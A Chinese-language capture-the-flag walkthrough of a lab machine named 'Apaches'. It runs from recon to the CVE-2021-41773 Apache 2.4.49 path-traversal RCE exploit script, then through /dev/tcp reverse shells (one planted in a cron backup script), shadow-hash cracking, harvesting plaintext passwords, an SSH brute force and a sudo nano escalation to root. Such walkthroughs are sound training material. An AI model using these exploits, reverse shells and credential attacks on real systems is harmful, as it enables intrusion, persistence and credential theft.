# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.2.0/24 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-19 00:22 EDT
Nmap scan report for apaches (192.168.2.11)
Host is up (0.00018s latency).
MAC Address: 08:00:27:B2:79:A9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for kali (192.168.2.10)
Host is up.
Nmap done: 256 IP addresses (9 hosts up) scanned in 4.68 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.2.11
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-19 00:34 EDT
Nmap scan report for apaches (192.168.2.11)
Host is up (0.00038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 bc:95:83:6e:c4:62:38:b5:a9:94:0c:14:a3:bf:57:34 (RSA)
|   256 07:fa:46:1a:ca:f3:dc:08:2f:72:8c:e2:f2:2e:32:e5 (ECDSA)
|_  256 46:ff:72:d5:67:c5:1f:87:b1:35:84:29:f3:ad:e8:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Apaches
|_http-server-header: Apache/2.4.49 (Unix)
MAC Address: 08:00:27:B2:79:A9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.38 ms apaches (192.168.2.11)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.54 seconds
```

# 漏洞利用

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u http://192.168.2.11 -x html,php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.11
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 199]
/index.html           (Status: 200) [Size: 33940]
/images               (Status: 301) [Size: 235] [--> http://192.168.2.11/images/]                                                         
/css                  (Status: 301) [Size: 232] [--> http://192.168.2.11/css/]                                                            
/js                   (Status: 301) [Size: 231] [--> http://192.168.2.11/js/]                                                             
/robots.txt           (Status: 200) [Size: 116]
/fonts                (Status: 301) [Size: 234] [--> http://192.168.2.11/fonts/]
/.html                (Status: 403) [Size: 199]
Progress: 4741016 / 4741020 (100.00%)
===============================================================
Finished
===============================================================
```

看一下/robots.txt

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.2.11/robots.txt
User-agent: *
Disallow: /

# IOKAnFlvdSBrbm93IHlvdXIgcGF0aCwgY2hpbGQsIG5vdyBmb2xsb3cgaXQu4oCdCi0tIFBvY2Fob250YXMg
```

![[Pasted image 20251019132230.png]]

寻找相关漏洞

```
┌──(kali㉿kali)-[~]
└─$ searchsploit apache 2.4.49
----------------------------------- ---------------------------------
 Exploit Title                     |  Path
----------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 -  | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 -  | php/remote/29316.py
Apache CXF < 2.5.10/2.6.7/2.7.4 -  | multiple/dos/26710.txt
Apache HTTP Server 2.4.49 - Path T | multiple/webapps/50383.sh
Apache mod_ssl < 2.8.7 OpenSSL - ' | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - ' | unix/remote/47080.c
Apache mod_ssl < 2.8.7 OpenSSL - ' | unix/remote/764.c
Apache OpenMeetings 1.9.x < 3.1.0  | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Di | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Di | multiple/remote/6229.txt
Apache Tomcat < 6.0.18 - 'utf8' Di | unix/remote/14489.c
Apache Tomcat < 9.0.1 (Beta) / < 8 | jsp/webapps/42966.py
Apache Tomcat < 9.0.1 (Beta) / < 8 | windows/webapps/42953.txt
Apache Xerces-C XML Parser < 3.1.2 | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache)  | linux/remote/34.pl
----------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
┌──(kali㉿kali)-[~]
└─$ cat 50383.sh                       
# Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
# Date: 10/05/2021
# Exploit Author: Lucas Souza https://lsass.io
# Vendor Homepage:  https://apache.org/
# Version: 2.4.49
# Tested on: 2.4.49
# CVE : CVE-2021-41773
# Credits: Ash Daulton and the cPanel Security Team

#!/bin/bash

if [[ $1 == '' ]]; [[ $2 == '' ]]; then
echo Set [TAGET-LIST.TXT] [PATH] [COMMAND]
echo ./PoC.sh targets.txt /etc/passwd
exit
fi
for host in $(cat $1); do
echo $host
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2"; done

# PoC.sh targets.txt /etc/passwd
# PoC.sh targets.txt /bin/sh whoami
```

利用

```
┌──(kali㉿kali)-[~]
└─$ echo "192.168.2.11" > targets.txt
                                                                     
┌──(kali㉿kali)-[~]
└─$ cat targets.txt 
192.168.2.11
                                                                     
┌──(kali㉿kali)-[~]
└─$ ./50383.sh targets.txt /bin/sh whoami
./50383.sh: 12: [[: not found
./50383.sh: 12: [[: not found
192.168.2.11
daemon
                                                                     
┌──(kali㉿kali)-[~]
└─$ ./50383.sh targets.txt /bin/sh 'bash -c "exec bash -i &>/dev/tcp/192.168.2.10/1234 <&1"'
./50383.sh: 12: [[: not found
./50383.sh: 12: [[: not found
192.168.2.11
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.2.10] from (UNKNOWN) [192.168.2.11] 54280
bash: cannot set terminal process group (887): Inappropriate ioctl for device
bash: no job control in this shell
daemon@apaches:/usr/bin$ id
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

# 权限提升

发现shadow可读

```
daemon@apaches:/home$ cat /etc/shadow
cat /etc/shadow
root:*:18375:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
lp:*:18375:0:99999:7:::
mail:*:18375:0:99999:7:::
news:*:18375:0:99999:7:::
uucp:*:18375:0:99999:7:::
proxy:*:18375:0:99999:7:::
www-data:*:18375:0:99999:7:::
backup:*:18375:0:99999:7:::
list:*:18375:0:99999:7:::
irc:*:18375:0:99999:7:::
gnats:*:18375:0:99999:7:::
nobody:*:18375:0:99999:7:::
systemd-network:*:18375:0:99999:7:::
systemd-resolve:*:18375:0:99999:7:::
systemd-timesync:*:18375:0:99999:7:::
messagebus:*:18375:0:99999:7:::
syslog:*:18375:0:99999:7:::
_apt:*:18375:0:99999:7:::
tss:*:18375:0:99999:7:::
uuidd:*:18375:0:99999:7:::
tcpdump:*:18375:0:99999:7:::
landscape:*:18375:0:99999:7:::
pollinate:*:18375:0:99999:7:::
sshd:*:19265:0:99999:7:::
systemd-coredump:!!:19265::::::
geronimo:$6$Ms03aNp5hRoOuZpM$CoHMkl9rgA0jZR2D9FfGJms9dR8OZw5j0gimH0V14DJ/F2Xp2.Mun4ESEdoNMoPC5ioRuOCXgakCB2snc6yiw0:19275:0:99999:7:::
lxd:!:19265::::::
squanto:$6$KzBC2ThBhmbVBy0J$eZSVdFLsAfd8IsbcAaBzHp8DzKXETPUH9FKsnlivIFSCvs0UBz1zsh9OfPmKcX5VaP7.Cy3r1r5msibslk0Sd.:19274:0:99999:7:::
sacagawea:$6$7jhI/21/BZR5KyY6$ry9zrhuggELLYnGkMtUi0UHBdDDaOiIgSB9y9od/73Qxk/nQOSzJNo3VKzZYS8pnluVYkXhVvghOzNCPBx79T1:19274:0:99999:7:::
pocahontas:$6$ecLWB6Q6bVJrGFu8$KgkvUSbQzXB6v3aJuE9NMwVvs2a53APkgzSxPq.DWfgIYKbzN0svWT4VDYm/l2ku7lMGJ8dxKi1fGphRx1tO8/:19274:0:99999:7:::
```

破解出来一个

```
┌──(kali㉿kali)-[~]
└─$ john -w=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 4 password hashes with 4 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iamtheone        (squanto)
```

切换一下

```
daemon@apaches:/home$ su squanto
su squanto
Password: iamtheone
id
uid=1001(squanto) gid=1001(squanto) groups=1001(squanto),1004(Lipan)
```

发现定时任务，在里面添加反弹shell

```
squanto@apaches:~$ cat /etc/cron*
cat /etc/cron*
cat: /etc/cron.d: Is a directory
cat: /etc/cron.daily: Is a directory
cat: /etc/cron.hourly: Is a directory
cat: /etc/cron.monthly: Is a directory
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

#* 5 * * * * su sacagawea -c "./home/sacagawea/Scripts/backup.sh"
cat: /etc/cron.weekly: Is a directory
squanto@apaches:~$ cat /home/sacagawea/Scripts/backup.sh
cat /home/sacagawea/Scripts/backup.sh
#!/bin/bash

rm -rf /home/sacagawea/Backup/Backup.tar.gz
tar -czvf /home/sacagawea/Backup/Backup.tar.gz /usr/local/apache2.4.49/htdocs
chmod 700 /home/sacagawea/Backup/Backup.tar.gz
squanto@apaches:~$ echo '/bin/bash -i &>/dev/tcp/192.168.2.10/4444 <&1' >> /home/sacagawea/Scripts/backup.sh
<2.10/4444 <&1' >> /home/sacagawea/Scripts/backup.sh
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444           
listening on [any] 4444 ...
connect to [192.168.2.10] from (UNKNOWN) [192.168.2.11] 43920
bash: cannot set terminal process group (6394): Inappropriate ioctl for device
bash: no job control in this shell
sacagawea@apaches:~$ id
id
uid=1002(sacagawea) gid=1002(sacagawea) groups=1002(sacagawea),1004(Lipan)
```

找到了几个账号密码，尝试爆破

```
sacagawea@apaches:~/Development/admin$ ls 
ls
1a-login.php
1b-login.css
2-check.php
3-protect.php
sacagawea@apaches:~/Development/admin$ cat 1a-login.php
cat 1a-login.php
<?php
// (A) LOGIN CHECKS
require "2-check.php";

// (B) LOGIN PAGE HTML ?>
<!DOCTYPE html>
<html>
  <head>
    <title>Login Apaches</title>
    <link href="1b-login.css" rel="stylesheet">
  </head>
  <body>
    <?php if (isset($failed)) { ?>
    <div id="bad-login">Invalid email or password.</div>
    <?php } ?>

    <form id="login-form" method="post" target="_self">
      <h1>PLEASE SIGN IN</h1>
      <label for="user">User</label>
      <input type="text" name="user" required/>
      <label for="password">Password</label>
      <input type="password" name="password" required/>
      <input type="submit" value="Sign In"/>
    </form>
  </body>
</html>
sacagawea@apaches:~/Development/admin$ cat 2-check.php
cat 2-check.php
<?php
// (A) START SESSION
session_start();

// (B) HANDLE LOGIN
if (isset($_POST["user"]) && !isset($_SESSION["user"])) {
  // (B1) USERS & PASSWORDS - SET YOUR OWN !
  $users = [
    "geronimo" => "12u7D9@4IA9uBO4pX9#6jZ3456",
    "pocahontas" => "y2U1@8Ie&OHwd^Ww3uAl",
    "squanto" => "4Rl3^K8WDG@sG24Hq@ih",
    "sacagawea" => "cU21X8&uGswgYsL!raXC"
  ];

  // (B2) CHECK & VERIFY
  if (isset($users[$_POST["user"]])) {
    if ($users[$_POST["user"]] == $_POST["password"]) {
      $_SESSION["user"] = $_POST["user"];
    }
  }

  // (B3) FAILED LOGIN FLAG
  if (!isset($_SESSION["user"])) { $failed = true; }
}

// (C) REDIRECT USER TO HOME PAGE IF SIGNED IN
if (isset($_SESSION["user"])) {
  header("Location: index.php");
  exit();
}
sacagawea@apaches:~/Development/admin$ cat 3-protect.php
cat 3-protect.php
<?php
// (A) START SESSION
session_start();

// (B) LOGOUT REQUEST
if (isset($_POST["logout"])) { unset($_SESSION["user"]); }

// (C) REDIRECT TO LOGIN PAGE IF NOT LOGGED IN
if (!isset($_SESSION["user"])) {
  header("Location: 1a-login.php");
  exit();
}
┌──(kali㉿kali)-[~]
└─$ hydra -L 1.txt -P 1.txt ssh://192.168.2.11
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-19 03:48:12
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 64 login tries (l:8/p:8), ~4 tries per task
[DATA] attacking ssh://192.168.2.11:22/
[22][ssh] host: 192.168.2.11   login: pocahontas   password: y2U1@8Ie&OHwd^Ww3uAl
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-19 03:48:28
```

ssh登录看一看

```
┌──(kali㉿kali)-[~]
└─$ ssh pocahontas@192.168.2.11         
The authenticity of host '192.168.2.11 (192.168.2.11)' can't be established.
ED25519 key fingerprint is SHA256:Rh8fFW5oIyfLABNlGvG850s8cm8NdtrTuTNfdvGyMuY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes                  
Warning: Permanently added '192.168.2.11' (ED25519) to the list of known hosts.
                                                                                
                                                                                
                                                                                
                                                                  
                                                                        >>       >======>         >>           >=>    >=>    >=> >=======>   >=>>=>   
                                                                       >>=>      >=>    >=>      >>=>       >=>   >=> >=>    >=> >=>       >=>    >=> 
                                                                      >> >=>     >=>    >=>     >> >=>     >=>        >=>    >=> >=>        >=>       
                          ~                                          >=>  >=>    >======>      >=>  >=>    >=>        >=====>>=> >=====>      >=>     
                    7~   ~&.                                        >=====>>=>   >=>          >=====>>=>   >=>        >=>    >=> >=>             >=>  
                    G!J !75!   ~G     :                            >=>      >=>  >=>         >=>      >=>   >=>   >=> >=>    >=> >=>       >=>    >=> 
                   ?~:B!. 5Y^!~^B. :~J&                           >=>        >=> >=>        >=>        >=>    >===>   >=>    >=> >=======>   >=>>=>
                 .GG?~    B^...PB?!^ ?5 .                         
                7&G:  7. JB7?7^..   ^&P&Y .7#                     If at first you don't succeed. Try, try again! Sometimes the second time returns more!
              .GG.  ~J. ?@5:  :~.  Y@@@@??!?#                     
             :#~  ~Y~  JJ  :77: .J&@#57:  :&!.~Y  .:              
            :&. ^P7  ^J::!7^.:!YJ!:....  Y@@@@@&J5@!              
            @7 Y5  :GP77~::~!~...:^:..:J#&#GPJ!:.PG               
           P@~B# ^B@G~^^!!~^^^^:...^7J7.       ^BP^?:             
          ^@@@@@&@#~7G5J7~::.:^~?JJ7~::^^~~~?B@@@@@&              
          &J!7?P#@B@@@B!:!?77???7!~~!!?J5PPP5YJ??YPYJ~.           
         ?P       :?B@&#@#?7!^^~?55Y7^:..       .^?J5Y^           
         ?B^^^::..    ~G&@#YP#&@B!....::::^~75B&@@@@#G!           
         :&~J?P&@@G?7!^..BG!~7B@#5J7!!7?JPGBB#BB&&@@B^            
         !5 ##J?PY    :JP&    .@&G5JY5GG57^:...   .~YBJ           
        ~5  :P7!^ ..^   ~@P~~~BB7^:.  .:~5G! .:!5B&@G!!.          
       .P      ~PGB#5   P:5!B&7~:Y&#&B&&#GPY7!!?5B@@&G:           
       Y7   ^^ .5GGB!  5~!7:7!G:. 7B7?~^^?G#P!....:GP             
       .~^JJ^   .     .G #..J ##!  J#~..:.  .7P#?^:.              
          !Y:^. ?.    ~Y &  7 PJ!P7^@@&Y!^^.  .J&Y                
           P!         ~P @. : Y&  5GPJ#??~~?#G!!!7.               
           !?       ^?J&.#J   B##: .  B7:.   5^                   
            !!^.:!PP^  !G!&.  5^7?J   ?#:~~^.:B^                  
              .::..!?   .!JG. &^  BG~.:@       .                  
                    JG!!^..5YYG5^ &..~Y&                          
                   .G...^?~  .  JB!    .                          
                   .G!7!:                                   
                   
pocahontas@192.168.2.11's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 19 Oct 2025 07:49:08 AM UTC

  System load:  0.04               Processes:               129
  Usage of /:   21.9% of 39.07GB   Users logged in:         0
  Memory usage: 30%                IPv4 address for enp0s3: 192.168.2.11
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

143 updates can be installed immediately.
2 of these updates are security updates.
To see these additional updates run: apt list --upgradable

New release '22.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


pocahontas@apaches:
```

nano可以进行提权

```
pocahontas@apaches:~$ sudo -l
[sudo] password for pocahontas: 
Matching Defaults entries for pocahontas on apaches:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pocahontas may run the following commands on apaches:
    (geronimo) /bin/nano
//sudo -u geronimo /bin/nano
//ctrl + r,ctrl + x
//reset; sh 1>&0 2>&0
$ id
uid=1000(geronimo) gid=1000(geronimo) groups=1000(geronimo),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
$ bash -c 'exec bash -i &>/dev/tcp/192.168.2.10/1234 <&1'
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.2.10] from (UNKNOWN) [192.168.2.11] 38840
geronimo@apaches:/home/pocahontas$ id
id
uid=1000(geronimo) gid=1000(geronimo) groups=1000(geronimo),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
geronimo@apaches:~$ sudo su
sudo su
id
uid=0(root) gid=0(root) groups=0(root)
```